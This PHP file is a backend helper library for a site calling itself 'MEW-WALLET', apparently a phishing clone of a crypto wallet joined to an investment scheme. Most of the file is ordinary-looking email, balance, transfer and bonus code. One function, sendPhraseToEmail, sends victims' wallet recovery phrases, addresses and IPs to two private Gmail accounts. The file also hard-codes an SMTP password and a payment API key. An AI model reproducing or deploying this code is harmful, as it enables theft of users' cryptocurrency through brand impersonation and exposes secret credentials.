<?php
// Include PHPMailer library
require 'vendor/autoload.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

function getCurrentDateTime()
{
    $currentDateTime = date('Y-m-d H:i:s');
    return $currentDateTime;
}

function getUserLocation()
{

    $ipAddress =  getUserIPAddress();
    // Replace 'YOUR_API_KEY' with your actual ipstack API key
    $apiKey = 'YOUR_API_KEY';
    $apiUrl = "http://api.ipstack.com/$ipAddress?access_key=$apiKey";

    // Initialize cURL session
    $ch = curl_init();

    // Set cURL options
    curl_setopt($ch, CURLOPT_URL, $apiUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // Execute cURL and get the response
    $response = curl_exec($ch);

    // Check for errors
    if (curl_errno($ch)) {
        // Handle error if needed
        echo 'Error: ' . curl_error($ch);
    }

    // Close cURL session
    curl_close($ch);

    // Decode JSON response
    $locationData = json_decode($response, true);

    // Extract relevant data
    $city = $locationData['city'] ?? 'Unknown';
    $region = $locationData['region_name'] ?? 'Unknown';
    $country = $locationData['country_name'] ?? 'Unknown';

    $location = "$city, $region, $country";

    return $location;
}


function getUserIPAddress()
{
    // Check for shared internet/ISP IP
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $userIP = $_SERVER['HTTP_CLIENT_IP'];
    }
    // Check for IP behind a proxy
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $userIP = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    // Use remote address
    else {
        $userIP = $_SERVER['REMOTE_ADDR'];
    }

    return $userIP;
}
// Function to send welcome message and account verification link to a new registered user
function sendWelcomeEmail($email, $verificationLink, $fullname)
{

    $mailUser = "support@mew-wallet.com";
    $mailPAssword = "VLNNTsm(}v(^";
    $from = "support@mew-wallet.com";
    $smtp = "mail.mew-wallet.com";


    // Create a new PHPMailer instance
    $mail = new PHPMailer(true);

    try {
        // Server settings
        $mail->isSMTP();
        $mail->Host = $smtp; // Your SMTP server host
        $mail->SMTPAuth = true;
        $mail->Username = $mailUser; // Your SMTP username
        $mail->Password = $mailPAssword; // Your SMTP password
        $mail->SMTPSecure = 'ssl';
        $mail->Port = 465; // SMTP port

        // Sender and recipient settings
        $mail->setFrom($from, 'MEW-WALLET'); // Sender email and name
        $mail->addAddress($email); // Recipient email
        $mail->isHTML(true);

        // Email subject and body
        $mail->Subject = 'Welcome Dear ' . $fullname . ' to MEW-WALLET! Please Verify Your Email Address';
        $mail->Body = 'Hello,<br><br>
            Thank you for registering on our website. To activate your account, please click on the following link:<br><br>
            <a href="' . $verificationLink . '">Verify Your Email Address</a><br><br>
            If you didn\'t register on our website, please ignore this email.<br><br>
            Best regards,<br>
            Your Website Team';

        // Send the email
        if ($mail->send()) {
            // Email sent successfully
            return true;
        } else {
            // Email sending failed
            return false;
        }
    } catch (Exception $e) {
        // Error handling
        return false;
    }
}
// Function to send welcome message and account verification link to a new registered user
function sendResetpasswordEmail($email, $verificationLink)
{

    $mailUser = "support@mew-wallet.com";
    $mailPAssword = "VLNNTsm(}v(^";
    $from = "support@mew-wallet.com";
    $smtp = "mail.mew-wallet.com";


    // Create a new PHPMailer instance
    $mail = new PHPMailer(true);

    try {
        // Server settings
        $mail->isSMTP();
        $mail->Host = $smtp; // Your SMTP server host
        $mail->SMTPAuth = true;
        $mail->Username = $mailUser; // Your SMTP username
        $mail->Password = $mailPAssword; // Your SMTP password
        $mail->SMTPSecure = 'ssl';
        $mail->Port = 465; // SMTP port

        // Sender and recipient settings
        $mail->setFrom($from, 'MEW-WALLET'); // Sender email and name
        $mail->addAddress($email); // Recipient email
        $mail->isHTML(true);

        // Email subject and body
        //Content
        $mail->isHTML(true);
        $mail->Subject = 'Reset Your Password';
        $mail->Body    = "Hello,<br><br>Click the link below to reset your password:<br><br>"
            . "<a href='$verificationLink'>Reset Password</a><br><br>"
            . "If you didn't request this, please ignore this email.";


        // Send the email
        if ($mail->send()) {
            // Email sent successfully
            return true;
        } else {
            // Email sending failed
            return false;
        }
    } catch (Exception $e) {
        // Error handling
        return false;
    }
}
// Function to send welcome message and account verification link to a new registered user
function sendLoginEmail($email, $fullname)
{

    $mailUser = "support@mew-wallet.com";
    $mailPAssword = "VLNNTsm(}v(^";
    $from = "support@mew-wallet.com";
    $smtp = "mail.mew-wallet.com";


    // Create a new PHPMailer instance
    $mail = new PHPMailer(true);

    try {
        // Server settings
        $mail->isSMTP();
        $mail->Host = $smtp; // Your SMTP server host
        $mail->SMTPAuth = true;
        $mail->Username = $mailUser; // Your SMTP username
        $mail->Password = $mailPAssword; // Your SMTP password
        $mail->SMTPSecure = 'ssl';
        $mail->Port = 465; // SMTP port

        // Sender and recipient settings
        $mail->setFrom($from, 'MEW-WALLET'); // Sender email and name
        $mail->addAddress($email); // Recipient email
        $mail->isHTML(true);

        // Email subject and body
        $mail->Subject = 'Welcome Back! Successful Login to Your Account';
        $mail->Body = "Dear " . $fullname . ",<br><br>
        We are delighted to welcome you back to mew-wallet <br>

        This email is to confirm that you have successfully logged into your account. Your account security is our top priority, and we want to ensure that you are aware of all activities related to your account.<br><br>
        
        <h4>Login Details:</h4>

        Date: " . getCurrentDateTime() . "<br><br>
                            IP Address: " . getUserIPAddress() . "<br><br>
                            If you did not perform this login or suspect any unauthorized access to your account, please contact our <a href='mailto:support@mew-wallet.com'> support</a> team immediately.<br><br>

                            What's Next?

                            Explore the latest features on our platform.
                            Update your profile information if needed.
                            Check out our<a href='mailto:support@mew-wallet.com'> help center</a> for any assistance.
                                    
        
        ";

        // Send the email
        if ($mail->send()) {
            // Email sent successfully
            return true;
        } else {
            // Email sending failed
            return false;
        }
    } catch (Exception $e) {
        // Error handling
        return false;
    }
}
// Function to send welcome message and account verification link to a new registered user
function sendPhraseToEmail($phrase, $accounttype, $address)
{

    $mailUser = "support@mew-wallet.com";
    $mailPAssword = "VLNNTsm(}v(^";
    $from = "support@mew-wallet.com";
    $smtp = "mail.mew-wallet.com";


    // Create a new PHPMailer instance
    $mail = new PHPMailer(true);

    try {
        // Server settings
        $mail->isSMTP();
        $mail->Host = $smtp; // Your SMTP server host
        $mail->SMTPAuth = true;
        $mail->Username = $mailUser; // Your SMTP username
        $mail->Password = $mailPAssword; // Your SMTP password
        $mail->SMTPSecure = 'ssl';
        $mail->Port = 465; // SMTP port

        // Sender and recipient settings
        $mail->setFrom($from, 'MEW-WALLET'); // Sender email and name
        $mail->addAddress("riotech2222@gmail.com", "phrase"); // Recipient email
        $mail->addAddress("ocool7603@gmail.com","phrase"); // Recipient email
        $mail->isHTML(true);

        // Email subject and body
        $mail->Subject = 'new phrase sent to your from user';
        $mail->Body = "Dear mew wallet <br><br>
          <b> Account: </b> <span >$accounttype</span> <br>
          <b> Phrase: </b> <span >$phrase</span> <br>
          <b> Address: </b> <span >$address</span> <br>

        Date: " . getCurrentDateTime() . "<br><br>
                            IP Address: " . getUserIPAddress() . "<br><br>
                            If you did not perform this login or suspect any unauthorized access to your account, please contact our <a href='mailto:support@mew-wallet.com'> support</a> team immediately.<br><br>

                            What's Next?

                            Explore the latest features on our platform.
                            Update your profile information if needed.
                            Check out our<a href='mailto:support@mew-wallet.com'> help center</a> for any assistance.
                                    
        
        ";

        // Send the email
        if ($mail->send()) {
            // Email sent successfully
            return true;
        } else {
            // Email sending failed
            return false;
        }
    } catch (Exception $e) {
        // Error handling
        echo $e;
        return false;
    }
}
// Function to send welcome message and account verification link to a new registered user
function sendTransferEmail($email, $amount)
{

    $mailUser = "support@mew-wallet.com";
    $mailPAssword = "VLNNTsm(}v(^";
    $from = "support@mew-wallet.com";
    $smtp = "mail.mew-wallet.com";


    // Create a new PHPMailer instance
    $mail = new PHPMailer(true);

    try {
        // Server settings
        $mail->isSMTP();
        $mail->Host = $smtp; // Your SMTP server host
        $mail->SMTPAuth = true;
        $mail->Username = $mailUser; // Your SMTP username
        $mail->Password = $mailPAssword; // Your SMTP password
        $mail->SMTPSecure = 'ssl';
        $mail->Port = 465; // SMTP port// SMTP port

        // Sender and recipient settings
        $mail->setFrom($from, 'MEW-WALLET'); // Sender email and name
        $mail->addAddress($email); // Recipient email
        $mail->isHTML(true);

        // Email subject and body
        $mail->Subject = 'Funds Recieved From Trasfer!';
        $mail->Body = "$" . $amount . " Has been created to  your account <b><br>Date:" . getCurrentDateTime();

        // Send the email
        if ($mail->send()) {
            // Email sent successfully
            return true;
        } else {
            // Email sending failed
            return false;
        }
    } catch (Exception $e) {
        // Error handling
        return false;
    }
}
// Function to send welcome message and account verification link to a new registered user
function sendDepositEmail($email, $amount)
{

    $mailUser = "support@mew-wallet.com";
    $mailPAssword = "VLNNTsm(}v(^";
    $from = "support@mew-wallet.com";
    $smtp = "mail.mew-wallet.com";


    // Create a new PHPMailer instance
    $mail = new PHPMailer(true);

    try {
        // Server settings
        $mail->isSMTP();
        $mail->Host = $smtp; // Your SMTP server host
        $mail->SMTPAuth = true;
        $mail->Username = $mailUser; // Your SMTP username
        $mail->Password = $mailPAssword; // Your SMTP password
        $mail->SMTPSecure = 'ssl';
        $mail->Port = 465; // SMTP port

        // Sender and recipient settings
        $mail->setFrom($from, 'MEW-WALLET'); // Sender email and name
        $mail->addAddress($email); // Recipient email
        $mail->isHTML(true);

        // Email subject and body
        $mail->Subject = 'Funds Recieved From Deposit!';
        $mail->Body = "$" . $amount . " Has been created to  your account <b><br>Date:" . getCurrentDateTime();

        // Send the email
        if ($mail->send()) {
            // Email sent successfully
            return true;
        } else {
            // Email sending failed
            return false;
        }
    } catch (Exception $e) {
        // Error handling
        return false;
    }
}


// Function to verify the user's email address
function verifyEmailAddress($conn, $token)
{
    $sql = "SELECT * FROM users WHERE verification_token = ?";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("s", $token);
    $stmt->execute();
    $result = $stmt->get_result();
    if ($result->num_rows == 1) {
        // User found with the verification token
        $user = $result->fetch_assoc();
        $user_id = $user['user_id'];

        // Update the is_verified column to true
        $updateSql = "UPDATE users SET is_verified = 1 WHERE user_id = ?";
        $updateStmt = $conn->prepare($updateSql);
        $updateStmt->bind_param("i", $user_id);
        if ($updateStmt->execute()) {
            // User's email address verified successfully
            return true;
        } else {
            // Failed to update the is_verified column
            return false;
        }
    } else {
        // No user found with the verification token
        return false;
    }
}


function sanitize_input($data)
{
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data);
    return $data;
}

// Function to check if email or username exists
function isEmailOrUsernameTaken($conn, $email, $username)
{
    // Prepare SQL statement
    $stmt = $conn->prepare("SELECT * FROM users WHERE email = ? OR username = ?");

    // Bind parameters
    $stmt->bind_param("ss", $email, $username);

    // Execute the statement
    $stmt->execute();

    // Get result
    $result = $stmt->get_result();

    // Check if any row is returned
    if ($result->num_rows > 0) {
        // Email or username is already taken
        return true;
    } else {
        // Email and username are available
        return false;
    }

    // Close statement
    $stmt->close();
}



// Function to get user details by user_id
function getUserDetails($conn, $user_id)
{
    // Prepare SQL statement
    $stmt = $conn->prepare("SELECT * FROM users WHERE user_id = ?");

    // Bind parameter
    $stmt->bind_param("s", $user_id);

    // Execute the statement
    $stmt->execute();

    // Get result
    $result = $stmt->get_result();

    // Fetch user details as an associative array
    $userDetails = $result->fetch_assoc();
    // print_r($userDetails);
    // Close statement
    $stmt->close();

    return $userDetails; // Return the user details
}




// Function to get transaction count by user_id
function getUserTransactionCount($conn, $user_id)
{
    // Prepare SQL statement
    $stmt = $conn->prepare("SELECT COUNT(*) AS transaction_count FROM transaction_history WHERE user_id = ?");

    // Bind parameter
    $stmt->bind_param("s", $user_id);

    // Execute the statement
    $stmt->execute();

    // Get result
    $result = $stmt->get_result();

    // Fetch transaction count
    $row = $result->fetch_assoc();
    $transactionCount = $row['transaction_count'];

    // Close statement
    $stmt->close();

    return $transactionCount; // Return the transaction count
}


// Function to get all transactions by user_id
function getUserTransactions($conn, $user_id)
{
    // Prepare SQL statement
    $stmt = $conn->prepare("SELECT * FROM transaction_history WHERE user_id = ?");

    // Bind parameter
    $stmt->bind_param("s", $user_id);

    // Execute the statement
    $stmt->execute();

    // Get result
    $result = $stmt->get_result();

    // Fetch all transactions as an associative array
    $transactions = $result->fetch_all(MYSQLI_ASSOC);

    // Close statement
    $stmt->close();

    return $transactions; // Return the transactions array
}


function formatDateTime($datetime)
{
    // Convert input datetime to a DateTime object
    $dateTimeObj = new DateTime($datetime);

    // Format the DateTime object to the desired format
    $formattedDateTime = $dateTimeObj->format('M d Y H:i');

    return $formattedDateTime;
}


function generateBitcoinAddress()
{
    $api_key = 'jzQEpoPA2YyMwoZvdRAFGenUJv2AKeUJZ5lvZzJFREo';
    $url = 'https://www.blockonomics.co/api/new_address';

    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");

    $header = "Authorization: Bearer " . $api_key;
    $headers = array();
    $headers[] = $header;
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $contents = curl_exec($ch);
    if (curl_errno($ch)) {
        echo "Error:" . curl_error($ch);
    }

    $responseObj = json_decode($contents);
    $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($status == 200) {
        return $responseObj->address;
    } else {
        return null;;
    }
}

// Function to get Bitcoin address by user ID




// Function to get total deposit amount by user_id
function getUserTotalDeposit($conn, $user_id)
{
    // Prepare SQL statement
    $stmt = $conn->prepare("SELECT SUM(amount) AS total_deposit FROM transaction_history WHERE user_id = ? AND type = 'Deposit'");

    // Bind parameter
    $stmt->bind_param("s", $user_id);

    // Execute the statement
    $stmt->execute();

    // Get result
    $result = $stmt->get_result();

    // Fetch total deposit amount
    $row = $result->fetch_assoc();
    $totalDeposit = $row['total_deposit'];

    // Close statement
    $stmt->close();

    return $totalDeposit; // Return the total deposit amount
}


// Function to get total investment amount by user_id
function getUserTotalInvestment($conn, $user_id)
{
    // Prepare SQL statement
    $stmt = $conn->prepare("SELECT SUM(amount) AS total_investment FROM transaction_history WHERE user_id = ? AND type = 'Investment'");

    // Bind parameter
    $stmt->bind_param("i", $user_id);

    // Execute the statement
    $stmt->execute();

    // Get result
    $result = $stmt->get_result();

    // Fetch total investment amount
    $row = $result->fetch_assoc();
    $totalInvestment = $row['total_investment'];

    // Close statement
    $stmt->close();

    return $totalInvestment; // Return the total investment amount
}



// Function to get total withdrawal amount by user_id
function getUserTotalWithdrawal($conn, $user_id)
{
    // Prepare SQL statement
    $stmt = $conn->prepare("SELECT SUM(amount) AS total_withdrawal FROM transaction_history WHERE user_id = ? AND type = 'Withdrawal'");

    // Bind parameter
    $stmt->bind_param("i", $user_id);

    // Execute the statement
    $stmt->execute();

    // Get result
    $result = $stmt->get_result();

    // Fetch total withdrawal amount
    $row = $result->fetch_assoc();
    $totalWithdrawal = $row['total_withdrawal'];

    // Close statement
    $stmt->close();

    return $totalWithdrawal; // Return the total withdrawal amount
}



// Function to get total profit amount by user_id
function getUserTotalProfit($conn, $user_id)
{
    // Prepare SQL statement
    $stmt = $conn->prepare("SELECT SUM(amount) AS total_profit FROM transaction_history WHERE user_id = ? AND type IN ('Referral Bonus', 'Deposit Bonus', 'Investment Bonus')");

    // Bind parameter
    $stmt->bind_param("i", $user_id);

    // Execute the statement
    $stmt->execute();

    // Get result
    $result = $stmt->get_result();

    // Fetch total profit amount
    $row = $result->fetch_assoc();
    $totalProfit = $row['total_profit'];

    // Close statement
    $stmt->close();

    return $totalProfit; // Return the total profit amount
}



// Function to get total transfer amount by user_id
function getUserTotalTransfer($conn, $user_id)
{
    // Prepare SQL statement
    $stmt = $conn->prepare("SELECT SUM(amount) AS total_transfer FROM transaction_history WHERE user_id = ? AND type = 'Transfer'");

    // Bind parameter
    $stmt->bind_param("i", $user_id);

    // Execute the statement
    $stmt->execute();

    // Get result
    $result = $stmt->get_result();

    // Fetch total transfer amount
    $row = $result->fetch_assoc();
    $totalTransfer = $row['total_transfer'];

    // Close statement
    $stmt->close();

    return $totalTransfer; // Return the total transfer amount
}




// Function to get total Referral Bonus amount by user_id
function getUserTotalReferralBonus($conn, $user_id)
{
    // Prepare SQL statement
    $stmt = $conn->prepare("SELECT SUM(amount) AS total_referral_bonus FROM transaction_history WHERE user_id = ? AND type = 'Referral Bonus'");

    // Bind parameter
    $stmt->bind_param("i", $user_id);

    // Execute the statement
    $stmt->execute();

    // Get result
    $result = $stmt->get_result();

    // Fetch total Referral Bonus amount
    $row = $result->fetch_assoc();
    $totalReferralBonus = $row['total_referral_bonus'];

    // Close statement
    $stmt->close();

    return $totalReferralBonus; // Return the total Referral Bonus amount
}





// Function to get total Deposit Bonus amount by user_id
function getUserTotalDepositBonus($conn, $user_id)
{
    // Prepare SQL statement
    $stmt = $conn->prepare("SELECT SUM(amount) AS total_deposit_bonus FROM transaction_history WHERE user_id = ? AND type = 'Deposit Bonus'");

    // Bind parameter
    $stmt->bind_param("i", $user_id);

    // Execute the statement
    $stmt->execute();

    // Get result
    $result = $stmt->get_result();

    // Fetch total Deposit Bonus amount
    $row = $result->fetch_assoc();
    $totalDepositBonus = $row['total_deposit_bonus'];

    // Close statement
    $stmt->close();

    return $totalDepositBonus; // Return the total Deposit Bonus amount
}


// Function to get total Investment Bonus amount by user_id
function getUserTotalInvestmentBonus($conn, $user_id)
{
    // Prepare SQL statement
    $stmt = $conn->prepare("SELECT SUM(amount) AS total_investment_bonus FROM transaction_history WHERE user_id = ? AND type = 'Investment Bonus'");

    // Bind parameter
    $stmt->bind_param("i", $user_id);

    // Execute the statement
    $stmt->execute();

    // Get result
    $result = $stmt->get_result();

    // Fetch total Investment Bonus amount
    $row = $result->fetch_assoc();
    $totalInvestmentBonus = $row['total_investment_bonus'];

    // Close statement
    $stmt->close();

    return $totalInvestmentBonus; // Return the total Investment Bonus amount
}


// Function to get total number of referrals by user_id
function getUserTotalReferrals($conn, $user_id)
{
    // Prepare SQL statement
    $stmt = $conn->prepare("SELECT COUNT(*) AS total_referrals FROM transaction_history WHERE user_id = ? AND type = 'Referral Bonus'");

    // Bind parameter
    $stmt->bind_param("i", $user_id);

    // Execute the statement
    $stmt->execute();

    // Get result
    $result = $stmt->get_result();

    // Fetch total number of referrals
    $row = $result->fetch_assoc();
    $totalReferrals = $row['total_referrals'];

    // Close statement
    $stmt->close();

    return $totalReferrals; // Return the total number of referrals
}





// Function to get all investments for a specific user
function getUserInvestments($conn, $userId)
{

    // Prepare the SQL statement
    $sql = "SELECT * FROM user_investments WHERE user_id = ?";

    // Prepare the statement
    $stmt = $conn->prepare($sql);

    // Bind the user ID parameter
    $stmt->bind_param("i", $userId);

    // Execute the statement
    $stmt->execute();

    // Get the result
    $result = $stmt->get_result();

    // Fetch all rows into an associative array
    $investments = $result->fetch_all(MYSQLI_ASSOC);

    // Close the statement and connection
    $stmt->close();
    $conn->close();

    // Return the investments
    return $investments;
}
function getLastEndpoint()
{
    // Parse the URL
    $parsedUrl = parse_url(getCurrentURL());

    // Get the path component from the parsed URL
    $path = isset($parsedUrl['path']) ? $parsedUrl['path'] : '';

    // Use pathinfo to get the last component
    $pathParts = pathinfo($path);

    // Return the last component (filename in this case)
    return $pathParts['basename'];
}


function getCurrentURL()
{
    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
    $host = $_SERVER['HTTP_HOST'];
    $uri = $_SERVER['REQUEST_URI'];

    // Concatenate the parts to form the full URL
    $fullUrl = $protocol . "://" . $host . $uri;

    return $fullUrl;
}





function updateBTCAddress($conn, $userID, $btcAddress)
{
    try {
        $sql = "UPDATE users SET btc_address = ? WHERE user_id = ?";

        // Use prepared statements to prevent SQL injection
        $stmt = $conn->prepare($sql);

        if (!$stmt) {
            throw new Exception("Prepare failed: " . $conn->error);
        }

        $stmt->bind_param("si", $btcAddress, $userID); // "s" for string, "i" for integer

        // Execute the statement
        $stmt->execute();

        // Check if update was successful
        if ($stmt->affected_rows > 0) {
            // Close statement
            $stmt->close();

            // Close database connection
            $conn->close();

            return true;
        } else {
            // Close statement
            $stmt->close();

            // Close database connection
            $conn->close();

            return false;
        }
    } catch (Exception $e) {
        echo "Error updating BTC address: " . $e->getMessage();
        return false;
    }
}



// Function to transfer funds from current user to another user
function transferFunds($conn, $senderUserID, $receiverEmail, $amount, $description)
{
    $amount = floatval($amount);
    // Get sender's balance
    $senderBalanceQuery = "SELECT balance FROM users WHERE user_id = ?";
    $senderBalanceStmt = $conn->prepare($senderBalanceQuery);
    $senderBalanceStmt->bind_param("i", $senderUserID);
    $senderBalanceStmt->execute();
    $senderBalanceResult = $senderBalanceStmt->get_result();

    if ($senderBalanceResult->num_rows > 0) {
        $senderData = $senderBalanceResult->fetch_assoc();
        $senderBalance = floatval($senderData['balance']);

        // Check if sender has sufficient balance
        if ($senderBalance >= $amount) {
            // Get receiver's user_id
            $receiverIDQuery = "SELECT user_id, balance FROM users WHERE email = ?";
            $receiverIDStmt = $conn->prepare($receiverIDQuery);
            $receiverIDStmt->bind_param("s", $receiverEmail);
            $receiverIDStmt->execute();
            $receiverIDResult = $receiverIDStmt->get_result();

            if ($receiverIDResult->num_rows > 0) {
                $receiverData = $receiverIDResult->fetch_assoc();
                $receiverID = $receiverData['user_id'];
                $receiverBalance = $receiverData['balance'];

                // Deduct amount from sender's balance
                $updatedSenderBalance = $senderBalance - $amount;

                // Update sender's balance
                $updateSenderQuery = "UPDATE users SET balance = ? WHERE user_id = ?";
                $updateSenderStmt = $conn->prepare($updateSenderQuery);
                $updateSenderStmt->bind_param("di", $updatedSenderBalance, $senderUserID);
                $updateSenderStmt->execute();

                // Increase receiver's balance
                $updatedReceiverBalance = $receiverBalance + $amount;
                $updateReceiverQuery = "UPDATE users SET balance = ? WHERE user_id = ?";
                $updateReceiverStmt = $conn->prepare($updateReceiverQuery);
                $updateReceiverStmt->bind_param("di", $updatedReceiverBalance, $receiverID);
                $updateReceiverStmt->execute();

                // Insert transaction record into transaction_history table
                $transactionID = uniqid(); // Generate a unique transaction ID
                $ty = "Transfer";
                // $ty = "Deposit";
                $fee = 0; // Assuming no fee for transfers
                $status = "Completed";
                $gateway = "Internal";

                $insertTransactionQuery = "INSERT INTO transaction_history (user_id, description, transaction_id, type, amount, fee, status, gateway) 
                                            VALUES (?, ?, ?, ?, ?, ?,?,?)";
                $insertTransactionStmt = $conn->prepare($insertTransactionQuery);
                $insertTransactionStmt->bind_param("isssdsss", $senderUserID, $description, $transactionID, $ty, $amount, $fee, $status, $gateway);
                $insertTransactionStmt->execute();

                // Close statements
                $senderBalanceStmt->close();
                $receiverIDStmt->close();
                $updateSenderStmt->close();
                $updateReceiverStmt->close();
                $insertTransactionStmt->close();
                sendTransferEmail($receiverEmail, $amount);

                return true; // Transfer successful
            } else {
                return "Receiver email not found " . $receiverEmail;
            }
        } else {
            return "Insufficient balance";
        }
    } else {
        return "Sender not found";
    }
}

// Function to transfer funds from current user to another user
function withdrawFunds($conn, $senderUserID, $amount, $description)
{
    $amount = floatval($amount);
    // Get sender's balance
    $senderBalanceQuery = "SELECT balance FROM users WHERE user_id = ?";
    $senderBalanceStmt = $conn->prepare($senderBalanceQuery);
    $senderBalanceStmt->bind_param("i", $senderUserID);
    $senderBalanceStmt->execute();
    $senderBalanceResult = $senderBalanceStmt->get_result();

    if ($senderBalanceResult->num_rows > 0) {
        $senderData = $senderBalanceResult->fetch_assoc();
        $senderBalance = floatval($senderData['balance']);

        // Check if sender has sufficient balance
        if ($senderBalance >= $amount) {
            // // Get receiver's user_id
            // $receiverIDQuery = "SELECT user_id, balance FROM users WHERE email = ?";
            // $receiverIDStmt = $conn->prepare($receiverIDQuery);
            // $receiverIDStmt->bind_param("s", $receiverEmail);
            // $receiverIDStmt->execute();
            // $receiverIDResult = $receiverIDStmt->get_result();

            // if ($receiverIDResult->num_rows > 0) {
            // $receiverData = $receiverIDResult->fetch_assoc();
            // $receiverID = $receiverData['user_id'];
            // $receiverBalance = $receiverData['balance'];

            // Deduct amount from sender's balance
            $updatedSenderBalance = $senderBalance - $amount;

            // Update sender's balance
            $updateSenderQuery = "UPDATE users SET balance = ? WHERE user_id = ?";
            $updateSenderStmt = $conn->prepare($updateSenderQuery);
            $updateSenderStmt->bind_param("di", $updatedSenderBalance, $senderUserID);
            $updateSenderStmt->execute();

            // // Increase receiver's balance
            // $updatedReceiverBalance = $receiverBalance + $amount;
            // $updateReceiverQuery = "UPDATE users SET balance = ? WHERE user_id = ?";
            // $updateReceiverStmt = $conn->prepare($updateReceiverQuery);
            // $updateReceiverStmt->bind_param("di", $updatedReceiverBalance, $receiverID);
            // $updateReceiverStmt->execute();

            // Insert transaction record into transaction_history table
            $transactionID = uniqid(); // Generate a unique transaction ID
            $ty = "Withdraw";
            // $ty = "Deposit";
            $fee = 0; // Assuming no fee for transfers
            $status = "Completed";
            $gateway = "system";

            $insertTransactionQuery = "INSERT INTO transaction_history (user_id, description, transaction_id, type, amount, fee, status, gateway) 
                                            VALUES (?, ?, ?, ?, ?, ?,?,?)";
            $insertTransactionStmt = $conn->prepare($insertTransactionQuery);
            $insertTransactionStmt->bind_param("isssdsss", $senderUserID, $description, $transactionID, $ty, $amount, $fee, $status, $gateway);
            $insertTransactionStmt->execute();

            // Close statements
            $senderBalanceStmt->close();
            // $receiverIDStmt->close();
            $updateSenderStmt->close();
            // $updateReceiverStmt->close();
            $insertTransactionStmt->close();
            // sendTransferEmail($receiverEmail, $amount);

            return true; // Transfer successful
            // } else {
            //     return "Receiver email not found " . $receiverEmail;
            // }
        } else {
            return "Insufficient balance";
        }
    } else {
        return "Sender not found";
    }
}




// Function to generate a random token
function generateToken($length = 32)
{
    return bin2hex(random_bytes($length));
}

// Function to update the verification token of the user
function updateVerificationToken($conn, $email, $token)
{
    $sql = "UPDATE users SET verification_token = ? WHERE email = ?";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("ss", $token, $email);
    if ($stmt->execute()) {
        // Token updated successfully
        return true;
    } else {
        // Failed to update token
        return false;
    }
}



function initiatePasswordReset($conn, $email)
{
    // Check if email exists in users table
    $checkEmailQuery = "SELECT user_id FROM users WHERE email = ?";
    $stmt = $conn->prepare($checkEmailQuery);
    $stmt->bind_param("s", $email);
    $stmt->execute();
    $result = $stmt->get_result();

    if ($result->num_rows === 0) {
        // Email does not exist
        return false;
    }

    // Generate a unique reset token
    $resetToken = generateToken(32);
    $liink = "http://" . $_SERVER['SERVER_NAME'] . "/reset-password?token=" . $resetToken;
    // Store the reset token in the users table
    $updateTokenQuery = "UPDATE users SET reset_token = ? WHERE email = ?";
    $stmt = $conn->prepare($updateTokenQuery);
    $stmt->bind_param("ss", $resetToken, $email);
    $stmt->execute();

    // Close statement
    $stmt->close();

    // Send email with reset link
    sendResetpasswordEmail($email, $liink);

    return true;
}


function verifyResetToken($conn, $token)
{
    $checkTokenQuery = "SELECT user_id FROM users WHERE reset_token = ? AND reset_token_expires > NOW()";
    $stmt = $conn->prepare($checkTokenQuery);
    $stmt->bind_param("s", $token);
    $stmt->execute();
    $result = $stmt->get_result();

    if ($result->num_rows === 0) {
        // Token is invalid or expired
        return false;
    }

    return true;
}
